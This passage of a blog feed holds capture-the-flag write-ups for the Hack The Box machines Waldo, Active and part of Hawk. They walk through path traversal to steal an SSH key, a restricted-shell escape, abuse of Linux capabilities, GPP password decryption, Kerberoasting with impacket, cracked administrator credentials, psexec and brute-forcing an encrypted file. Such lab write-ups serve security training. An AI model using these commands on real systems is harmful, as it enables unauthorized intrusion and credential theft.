&lt;h4 id=&quot;then-after-enumerating-in-home-directory-we-will-find-out-that-we-can-read-the-ssh-key-of-a-user-called-nobody-homenobodyssh-but-the-ssh-key--is-called-monitor&quot;&gt;Then after enumerating in home directory we will find out that we can read the ssh key of a user called nobody &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/nobody/.ssh&lt;/code&gt; but the ssh key  is called .monitor&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/8.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-we-can-only-read-directories-with-dirreadphp&quot;&gt;But we can only read directories with dirRead.php.&lt;/h4&gt;
&lt;h4 id=&quot;if-we-check-filereadphp-we-will-find-a-path-traversal-there-too&quot;&gt;If we check fileRead.php we will find a path traversal there too.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/9.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/waldo/10.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-have-the-key-but-its-json-decoded-we-can-use-any-online-json-decoder&quot;&gt;Now we have the key but it’s json decoded. We can use any online json decoder.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/11.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/waldo/12.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/waldo/13.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ssh-as-nobody&quot;&gt;SSH as nobody&lt;/h3&gt;
&lt;h4 id=&quot;now-will-change-permissions-to-600-then-try-ssh-with-nobody-if-we-try-monitor-it-will-give-us-permission-denied&quot;&gt;Now will change permissions to 600 then try ssh with nobody. If we try monitor it will give us permission denied.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 600 monitor.key&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i monitor.key nobody@10.10.10.87&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/waldo/14.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/waldo/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-user-&quot;&gt;And we got user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;privilege-escalation-to-monitor&quot;&gt;Privilege Escalation to monitor&lt;/h2&gt;

&lt;h4 id=&quot;after-we-login-as-nobody-we-need-to-elevate-to-a-higher-privileged-user&quot;&gt;After we login as nobody we need to elevate to a higher privileged user.&lt;/h4&gt;
&lt;h4 id=&quot;since-we-couldnt-ssh-as-monitor-before-lets-try-again-but-this-time-locally&quot;&gt;Since we couldn’t ssh as monitor before let’s try again but this time locally.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/16.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/waldo/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-were-in-as-monitor-&quot;&gt;And We’re in as monitor .&lt;/h4&gt;
&lt;h4 id=&quot;but-we-are-in-a-restricted-shell-and-cant-run-commands-&quot;&gt;But we are in a restricted shell and can’t run commands .&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-try-some-commands-and-ls-will-work-&quot;&gt;We can try some commands and ls will work .&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/19.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-see-two-directories-app-dev-and-bin-&quot;&gt;We see two directories app-dev and bin .&lt;/h4&gt;
&lt;h4 id=&quot;lets-ls-bin-and-see-what-commands-can-we-run-&quot;&gt;Let’s ls bin and see what commands can we run .&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-run-ls--most--red--rnano&quot;&gt;We can run ls , most , red , rnano&lt;/h4&gt;
&lt;h4 id=&quot;rnano-and-red-are-restricted-versions-of-the-text-editors-nano-and-ed&quot;&gt;rnano and red are restricted versions of the text editors nano and ed&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;escaping-the-restricted-shell&quot;&gt;Escaping the restricted shell&lt;/h2&gt;
&lt;h4 id=&quot;we-can-use-red-to-escape&quot;&gt;We can use red to escape.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-run-it-first-&quot;&gt;We will run it first .&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;red&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-execute-sh-from-the-editor-&quot;&gt;Then we will execute sh from the editor .&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;!'/bin/sh'&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-cd-to-bin-and-execute-bash-&quot;&gt;And we cd to /bin and execute bash .&lt;/h4&gt;
&lt;h4 id=&quot;and-we-escaped-the-shell-&quot;&gt;And we escaped the shell !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/21.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/waldo/22.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;exploiting-capabilities-and-getting-roottxt&quot;&gt;Exploiting Capabilities and getting root.txt&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-is-where-the-awesome-part-comes-for-me-it-was-the-first-time-to-deal-with-linux-capabilities&quot;&gt;This is where the awesome part comes. For me it was the first time to deal with linux capabilities.&lt;/h4&gt;
&lt;h4 id=&quot;if-we-look-at-the-bins-in-sbin-we-will-see-getcap&quot;&gt;If we look at the bins in /sbin we will see getcap.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-if-we-run-getcap-on-the-bin-folders&quot;&gt;So If we run getcap on the bin folders.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/waldo/24.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/waldo/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-find-under-usrbin-that-a-binary-named-tac-has-the-cap_dac-read_searchei-capability&quot;&gt;We will find under &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; that a binary named tac has the &lt;code class=&quot;highlighter-rouge&quot;&gt;cap_dac read_search+ei&lt;/code&gt; capability&lt;/h4&gt;
&lt;h4 id=&quot;this-allows-it-to-read-files-as-root-&quot;&gt;This allows it to read files as root .&lt;/h4&gt;
&lt;h4 id=&quot;and-tac-does-exactly-the-same-as-cat-but-the-name-is-reversed-&quot;&gt;And tac does exactly the same as cat but the name is reversed .&lt;/h4&gt;
&lt;h4 id=&quot;we-can-simply-read-roottxt&quot;&gt;We can simply read root.txt&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tac /root/root.txt &lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/waldo/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;and-that-was-waldo-feedback-is-appreciated-&quot;&gt;And that was Waldo. Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks For Reading.&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Waldo was a great box and what makes it special is its unique way in getting the root flag. Every step with this box was very fun and I liked this box too much. It’s a linux box and its ip is 10.10.10.87 so let’s jump right in Nmap Starting with nmap to scan for open TCP ports and services. nmap -sV -sT 10.10.10.87 We only see http on port 80 and ssh on port 22. On port 80 there’s a web application called List Manager. Path Traversal We will intercept the traffic with Burp then we will start to perform actions on the application like creating a list , editing it , deleteing it etc.. By looking at the requests we will find two interesting requests. The POST request to fileRead.php and the POST request to dirRead.php. Let’s send them to the repeater and play with them. We will notice that dirRead.php lists the contents of a directory by giving the path in a POST request so we might have a path traversal vulnerability here. If we tried to go up one directory it works But going up 2 directories doesn’t work so there might be a filter that prevents that. We can try to bypass the filter by adding another ../. And it worked SSH key for monitor Then after enumerating in home directory we will find out that we can read the ssh key of a user called nobody /home/nobody/.ssh but the ssh key is called .monitor But we can only read directories with dirRead.php. If we check fileRead.php we will find a path traversal there too. Now we have the key but it’s json decoded. We can use any online json decoder. SSH as nobody Now will change permissions to 600 then try ssh with nobody. If we try monitor it will give us permission denied. chmod 600 monitor.key ssh -i monitor.key nobody@10.10.10.87 And we got user ! Privilege Escalation to monitor After we login as nobody we need to elevate to a higher privileged user. Since we couldn’t ssh as monitor before let’s try again but this time locally. And We’re in as monitor . But we are in a restricted shell and can’t run commands . We can try some commands and ls will work . We see two directories app-dev and bin . Let’s ls bin and see what commands can we run . We can run ls , most , red , rnano rnano and red are restricted versions of the text editors nano and ed Escaping the restricted shell We can use red to escape. We will run it first . red Then we will execute sh from the editor . !'/bin/sh' And we cd to /bin and execute bash . And we escaped the shell ! Exploiting Capabilities and getting root.txt This is where the awesome part comes. For me it was the first time to deal with linux capabilities. If we look at the bins in /sbin we will see getcap. So If we run getcap on the bin folders. We will find under /usr/bin that a binary named tac has the cap_dac read_search+ei capability This allows it to read files as root . And tac does exactly the same as cat but the name is reversed . We can simply read root.txt tac /root/root.txt And that was Waldo. Feedback is appreciated ! Thanks For Reading.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/waldo/0.png" /></entry><entry><title type="html">Hack The Box - Active</title><link href="http://localhost:4000/hack-the-box/active/" rel="alternate" type="text/html" title="Hack The Box - Active" /><published>2018-12-08T00:00:00+02:00</published><updated>2018-12-08T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/active</id><content type="html" xml:base="http://localhost:4000/hack-the-box/active/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;active-was-a-great-box-and-very-realistic--kinda-easy-if-youre-familiar-with-windows-active-directory-security-but-if-youre-not--then-this-box-will-teach-you-something-its-a-windows-box-and-its-ip-is-101010100-so-lets-jump-right-in-&quot;&gt;Active was a great box and very realistic , Kinda easy if you’re familiar with windows active directory security. But if you’re not … then this box will teach you something. It’s a windows box and its ip is 10.10.10.100 so let’s jump right in .&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/active/0.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-tcp-ports-and-services&quot;&gt;As Always we will start with nmap to scan for TCP ports and Services&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT 10.10.10.100&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/active/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-see-many-ports-open-but-we-will-focus-on-the-important-ports-only&quot;&gt;And we see many ports open but we will focus on the important ports only.&lt;/h4&gt;
&lt;h4 id=&quot;kerberos-on-88--netbios-ssn-on-139--ldap-on-389-and-3268&quot;&gt;Kerberos on 88 , netbios-ssn on 139 , ldap on 389 and 3268.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb-enumeration&quot;&gt;SMB Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;since-we-have-netbios-ssn-open-on-port-139-lets-run-smbmap-and-see-what-we-get&quot;&gt;Since we have netbios-ssn open on port 139 let’s run smbmap and see what we get.&lt;/h4&gt;
&lt;h4 id=&quot;if-youre-not-on-kali-you-can-get-smbmap-from-here&quot;&gt;If you’re not on kali you can get smbmap from &lt;a href=&quot;https://github.com/ShawnDEvans/smbmap&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H 10.10.10.100&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/active/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-see-that-we-can-only-access-the-share-replication-anonymously&quot;&gt;And we see that we can only access the share &lt;em&gt;Replication&lt;/em&gt; anonymously&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient //10.10.10.100/Replication&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/active/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-we-access-the-share-we-will-find-a-file-called-groupsxml-in-activehtbpolicies31b2f340-016d-11d2-945f-00c04fb984f9machinepreferencesgroups&quot;&gt;After we access the share we will find a file called &lt;em&gt;Groups.xml&lt;/em&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;by-looking-at-the-file-we-will-find-a-username-and-an-encrypted-password&quot;&gt;By looking at the file we will find a username and an encrypted password.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/active/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;decrypting-gpp&quot;&gt;Decrypting GPP&lt;/h3&gt;
&lt;h4 id=&quot;so-if-you-dont-know-whats-that-cpassword--its-called-gpp-group-policy-password-and-i-wont-talk-about-it-in-the-write-up-if-youre-interested-heres-a-great-resource-to-read-about-it&quot;&gt;So if you don’t know what’s that cpassword … it’s called gpp (Group Policy Password) And I won’t talk about it in the write-up. If you’re interested &lt;a href=&quot;https://adsecurity.org/?p=2288&quot;&gt;here’s a great resource to read about it&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;to-decrypt-it-theres-a-tool-called-gpp-decrypt-if-youre-not-on-kali-get-it-from-here&quot;&gt;To decrypt it there’s a tool called gpp-decrypt. If you’re not on kali get it from &lt;a href=&quot;https://github.com/BustedSec/gpp-decrypt&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/active/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-the-password-gppstillstandingstrong2k18&quot;&gt;And we got the password GPPstillStandingStrong2k18&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;user&quot;&gt;User&lt;/h3&gt;
&lt;h4 id=&quot;now-we-have-the-credentials-svc_tgsgppstillstandingstrong2k18-and-we-can-own-user&quot;&gt;Now we have the credentials SVC_TGS:GPPstillStandingStrong2k18 and we can own user&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient //10.10.10.100/Users -U SVC_TGS&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/active/6.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/active/7.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/active/8.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;kerberoasting&quot;&gt;Kerberoasting&lt;/h3&gt;
&lt;h4 id=&quot;now-if-we-return-to-our-nmap-scan&quot;&gt;Now if we return to our nmap scan.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/active/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-see-that-we-have-kerberos-running-on-port-88-and-we-have-owned-a-user-on-the-box-so-we-will-go-for-kerberoasting-and-if-you-dont-know-what-kerberoasting-technique-is-you-can-read-this-great-series-about-it&quot;&gt;We will see that we have kerberos running on port 88 and we have owned a user on the box so we will go for kerberoasting and if you don’t know what kerberoasting technique is you can read this great series about it&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;part-1&quot;&gt;&lt;a href=&quot;https://room362.com/post/2016/kerberoast-pt1/&quot;&gt;Part 1&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;part-2&quot;&gt;&lt;a href=&quot;https://room362.com/post/2016/kerberoast-pt2/&quot;&gt;Part 2&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;part-3&quot;&gt;&lt;a href=&quot;https://room362.com/post/2016/kerberoast-pt3/&quot;&gt;Part 3&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;first-we-will-add-101010100-to-our-etchosts&quot;&gt;First we will add 10.10.10.100 to our /etc/hosts&lt;/h4&gt;
&lt;h4 id=&quot;then-we-will-use-getuserspnspy-from-impacket-to-get-administrator--kerberos-ticket&quot;&gt;Then We will use GetUserSPNs.py from &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;impacket&lt;/a&gt; to get administrator  Kerberos ticket&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./GetUserSPNs.py -request active.htb/SVC_TGS&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/active/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-the-ticket-in-john-format-so-its-ready-for-cracking&quot;&gt;And we got the ticket in john format so it’s ready for cracking.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-just-add-the-option--outputfile-to-save-the-ticket-in-a-file-and-were-ready-to-go&quot;&gt;We will just add the option &lt;code class=&quot;highlighter-rouge&quot;&gt;-outputfile&lt;/code&gt; to save the ticket in a file and we’re ready to go.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/active/10.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;cracking-the-ticket&quot;&gt;Cracking The Ticket&lt;/h3&gt;
&lt;h4 id=&quot;we-will-use-john-to-crack-the-ticket-with-rockyoutxt&quot;&gt;We will use john to crack the ticket with rockyou.txt&lt;/h4&gt;
&lt;h4 id=&quot;and-one-of-the-problems-that-i-faced-when-i-was-trying-to-crack-the-ticket-is-that-john-wasnt-recognizing-the-format-so-make-sure-youre-using-an-updated-version-of-both-impacket-and-john-because-impacket-also-had-problems-with-the-hash-format-output-for-me-the-problem-was-with-john-so-i-solved-it-by-using-jumbo-version-of-john&quot;&gt;And one of the problems that I faced when I was trying to crack the ticket is that john wasn’t recognizing the format so make sure you’re using an updated version of both impacket and john because impacket also had problems with the hash format output. For me the problem was with john so I solved it by using &lt;a href=&quot;https://github.com/magnumripper/JohnTheRipper&quot;&gt;jumbo version of john&lt;/a&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/active/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-the-administrator-password--ticketmaster1968&quot;&gt;And we got the administrator password : Ticketmaster1968&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;root&quot;&gt;Root&lt;/h3&gt;
&lt;h4 id=&quot;now-we-can-easily-get-a-root-shell-using-psexecpy-from-impacket&quot;&gt;Now we can easily get a root shell using psexec.py from &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;impacket&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./psexec.py administrator@active.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/active/12.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;that-was-active-feedback-is-appreciated-&quot;&gt;That was Active. Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Active was a great box and very realistic , Kinda easy if you’re familiar with windows active directory security. But if you’re not … then this box will teach you something. It’s a windows box and its ip is 10.10.10.100 so let’s jump right in . Nmap As Always we will start with nmap to scan for TCP ports and Services nmap -sV -sT 10.10.10.100 And we see many ports open but we will focus on the important ports only. Kerberos on 88 , netbios-ssn on 139 , ldap on 389 and 3268. SMB Enumeration Since we have netbios-ssn open on port 139 let’s run smbmap and see what we get. If you’re not on kali you can get smbmap from here smbmap -H 10.10.10.100 And we see that we can only access the share Replication anonymously smbclient //10.10.10.100/Replication After we access the share we will find a file called Groups.xml in \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\ By looking at the file we will find a username and an encrypted password. Decrypting GPP So if you don’t know what’s that cpassword … it’s called gpp (Group Policy Password) And I won’t talk about it in the write-up. If you’re interested here’s a great resource to read about it To decrypt it there’s a tool called gpp-decrypt. If you’re not on kali get it from here And we got the password GPPstillStandingStrong2k18 User Now we have the credentials SVC_TGS:GPPstillStandingStrong2k18 and we can own user smbclient //10.10.10.100/Users -U SVC_TGS Kerberoasting Now if we return to our nmap scan. We will see that we have kerberos running on port 88 and we have owned a user on the box so we will go for kerberoasting and if you don’t know what kerberoasting technique is you can read this great series about it Part 1 Part 2 Part 3 First we will add 10.10.10.100 to our /etc/hosts Then We will use GetUserSPNs.py from impacket to get administrator Kerberos ticket ./GetUserSPNs.py -request active.htb/SVC_TGS And we got the ticket in john format so it’s ready for cracking. We will just add the option -outputfile to save the ticket in a file and we’re ready to go. Cracking The Ticket We will use john to crack the ticket with rockyou.txt And one of the problems that I faced when I was trying to crack the ticket is that john wasn’t recognizing the format so make sure you’re using an updated version of both impacket and john because impacket also had problems with the hash format output. For me the problem was with john so I solved it by using jumbo version of john. ./john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt And we got the administrator password : Ticketmaster1968 Root Now we can easily get a root shell using psexec.py from impacket ./psexec.py administrator@active.htb That was Active. Feedback is appreciated ! Thanks for reading.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/active/0.png" /></entry><entry><title type="html">Hack The Box - Hawk</title><link href="http://localhost:4000/hack-the-box/hawk/" rel="alternate" type="text/html" title="Hack The Box - Hawk" /><published>2018-12-01T00:00:00+02:00</published><updated>2018-12-01T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/hawk</id><content type="html" xml:base="http://localhost:4000/hack-the-box/hawk/">&lt;hr /&gt;

&lt;h4 id=&quot;hawk-has-retired-and-this-is-my-write-up-about-it&quot;&gt;Hawk has retired and this is my write-up about it.&lt;/h4&gt;
&lt;h4 id=&quot;its-a-linux-box-and-its-ip-is-101010102-so-lets-jump-right-in-&quot;&gt;It’s a Linux box and it’s ip is 10.10.10.102 so let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;starting-with-a-simple-nmap-scan-to-scan-tor-tcp--udp-ports-and-services&quot;&gt;Starting with a simple nmap scan to scan tor TCP , UDP ports and services.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sU 10.10.10.102&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hawk/1.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-see-that-we-got-ftp-on-port-21--ssh-on-port-22--http-on-port-80-running-apache-server-and-http-on-port-8082-running-h2-database-http-console&quot;&gt;We will see that we got FTP on port 21 , SSH on port 22 , HTTP on port 80 running apache server and HTTP on port 8082 running H2 Database HTTP Console.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ftp&quot;&gt;FTP&lt;/h3&gt;
&lt;h4 id=&quot;since-theres-ftp-on-the-box-lets-check-if-we-can-do-anonymous-login&quot;&gt;Since there’s FTP on the box let’s check if we can do anonymous login.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-could-login-as-anonymous-and-we-got-a-file-called--drupaltxtenc&quot;&gt;We could login as anonymous and we got a file called : .drupal.txt.enc&lt;/h4&gt;
&lt;h4 id=&quot;since-it-ends-with-enc-then-its-an-encrypted-file&quot;&gt;Since it ends with .enc then it’s an encrypted file.&lt;/h4&gt;
&lt;h4 id=&quot;lets-run-file-command-against-it-to-get-more-information&quot;&gt;Let’s run file command against it to get more information.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file drupal.txt.enc
drupal.txt.enc : openssl enc'd data with salted password , base64 encoded
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-base64-encoded--lets-decode-it&quot;&gt;So base64 encoded ? Let’s decode it.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d drupal.txt.enc &amp;gt; drupal_decoded.txt.enc&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hawk/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-the-file-is-ready-for-bruteforcing&quot;&gt;Now the file is ready for bruteforcing.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;decrypting-the-file&quot;&gt;Decrypting The File&lt;/h3&gt;
&lt;h4 id=&quot;to-get-the-password-for-decryption-we-will-use-a-tool-called-bruteforce-salted-openssl-with-rockyou&quot;&gt;To get the password for decryption we will use a tool called bruteforce-salted-openssl with rockyou.&lt;/h4&gt;
&lt;h4 id=&quot;its-already-installed-on-kali-but-if-youre-not-using-kali-you-can-get-it-from-here&quot;&gt;It’s already installed on kali but if you’re not using kali you can get it from &lt;a href=&quot;https://github.com/glv2/bruteforce-salted-openssl&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-theres-a-small-problem-we-need-to-specify-the-right-cipher-and-digest-to-be-able-to-crack-the-file-so-we-have-to-do-some-guessing&quot;&gt;Now there’s a small problem. We need to specify the right cipher and digest to be able to crack the file so we have to do some guessing.&lt;/h4&gt;
&lt;h4 id=&quot;i-already-cracked-it-so-the-cipher-is-aes-256-cbc-and-the-digest-is-sha256&quot;&gt;I already cracked it so the cipher is AES-256-CBC and the digest is SHA256.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal_decoded.txt.enc -1&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;you-may-ask-yourself-why-i-didnt-specify-the-cipher-i-didnt-specify-it-because-the-tool-uses-aes-256-cbc-by-default&quot;&gt;You may ask yourself why I didn’t specify the cipher. I didn’t specify it because the tool uses AES-256-CBC by default.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great--we-got-the-password--friends--lets-decrypt-the-file&quot;&gt;Great ! We got the password : friends . Let’s decrypt the file.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl aes-256-cbc -d -in drupal_decoded.txt.enc -out drupal.txt -k friends&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hawk/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
